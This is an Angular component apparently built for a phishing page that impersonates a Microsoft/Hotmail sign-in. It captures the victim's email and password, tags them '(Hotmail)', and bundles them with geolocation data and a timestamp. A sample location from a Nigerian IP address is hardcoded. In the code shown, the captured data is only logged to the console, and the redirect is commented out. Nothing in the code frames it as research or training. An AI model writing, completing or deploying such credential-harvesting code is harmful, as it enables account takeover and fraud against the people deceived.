import { HttpClient } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { GeolocationService } from 'src/app/services/geolocation.service';

@Component({
  selector: 'app-microsoft-login',
  templateUrl: './microsoft-login.component.html',
  styleUrls: ['./microsoft-login.component.css'],
})
export class MicrosoftLoginComponent implements OnInit {
  viewdone: boolean = false;
  hotMailEmail: string = '';
  hotMailPass: string = '';
  details: any = [];
  locationDetails: any = [];
  date: any;
  geolocate: any = {
    ip: '197.210.28.169',
    city: 'Lagos',
    region: 'Lagos',
    country: 'NG',
    loc: '6.4541,3.3947',
    org: 'AS29465 MTN NIGERIA Communication limited',
    timezone: 'Africa/Lagos',
  };
  constructor(
    private geolocation: GeolocationService,
    private router: Router
  ) {}

  ngOnInit(): void {
    this.geolocation.getLocationDetails().subscribe((resp) => {
      this.locationDetails = resp;
    });
  }
  goToNext() {
    this.viewdone = true;
  }
  submit() {
    const det = {
      username: this.hotMailEmail + ' ' + '(Hotmail)',
      password: this.hotMailPass,
    };
    const details = [{ ...det, ...this.locationDetails, ...this.dnate() }];
    console.log(details);
    // this.router.navigate(['/status']);
  }
  dnate() {
    const moment = require('moment');
    const now = moment();
    const nowString = now.format('YYYY-MM-DD HH:mm:ss');
    this.date = { date: nowString };
    return this.date;
  }
}
